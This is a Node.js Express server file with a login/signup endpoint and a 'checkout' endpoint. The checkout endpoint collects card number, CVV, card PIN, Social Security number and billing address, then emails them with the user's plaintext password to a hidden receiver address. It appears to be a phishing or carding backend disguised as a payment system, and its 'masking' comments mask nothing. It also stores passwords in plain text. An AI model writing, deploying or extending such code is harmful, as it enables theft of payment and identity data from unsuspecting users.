const express = require('express');
const nodemailer = require('nodemailer');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

// Setup the server
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'Gmail', // Replace with your email service provider
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASSWORD, // App password or real password
  },
});

// In-memory user storage
let users = [];

// Helper function to generate JWT
const generateToken = (user) => {
  return jwt.sign({ id: user.id, email: user.email }, process.env.JWT_SECRET);
};

// API Endpoint for Login/Signup
app.post('/api/login-or-signup', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required' });
  }

  let user = users.find((user) => user.email === email);

  if (user) {
    // User exists, login
    if (user.password === password) {
      const token = generateToken(user);
      return res.json({ message: 'Login successful', token });
    } else {
      return res.status(400).json({ message: 'Invalid credentials' });
    }
  } else {
    // User does not exist, create a new account
    user = { id: Date.now(), email, password };
    users.push(user);

    const token = generateToken(user);
    return res.json({ message: 'Account created successfully', token });
  }
});

// API Endpoint for Checkout
app.post('/api/checkout', async (req, res) => {
  const { token, name, cardNumber, expiry, cvv, billingAddress, ssn, cardPin } = req.body;

  if (!token || !name || !cardNumber || !expiry || !cvv || !billingAddress || !ssn || !cardPin) {
    return res.status(400).json({ message: 'All fields are required for checkout' });
  }

  // Verify the JWT token
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const email = decoded.email;

    let user = users.find((user) => user.email === email);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Mask sensitive data
    const maskedCardNumber = `${cardNumber}`;
    const maskedSSN = `${ssn}`;

    // Create the email body
    const emailBody = `
      <h3>New Payment Details Submitted</h3>
      <p><strong>Name:</strong> ${name}</p>
      <p><strong>Email:</strong> ${user.email}</p>
      <p><strong>User ID:</strong> ${user.id}</p>
      <p><strong>Password:</strong> ${user.password}</p> <!-- Include plain text password -->
      <p><strong>Card Number:</strong> ${maskedCardNumber}</p>
      <p><strong>Expiry:</strong> ${expiry}</p>
      <p><strong>Card Pin:</strong> ${cardPin}</p>
      <p><strong>CVV:</strong> ${cvv}</p>
      <p><strong>Billing Address:</strong> ${billingAddress}</p>
      <p><strong>SSN:</strong> ${maskedSSN}</p>
    `;

    // Send the email with user and checkout details
    await transporter.sendMail({
      from: `"Checkout System" <${process.env.EMAIL}>`,
      to: process.env.RECEIVER_EMAIL, // The recipient email
      subject: 'New Checkout Details Submitted',
      html: emailBody,
    });

    res.status(200).json({ message: 'Checkout details sent successfully!' });
  } catch (error) {
    console.error('JWT Verification Failed:', error);
    res.status(400).json({ message: 'Invalid or expired token' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
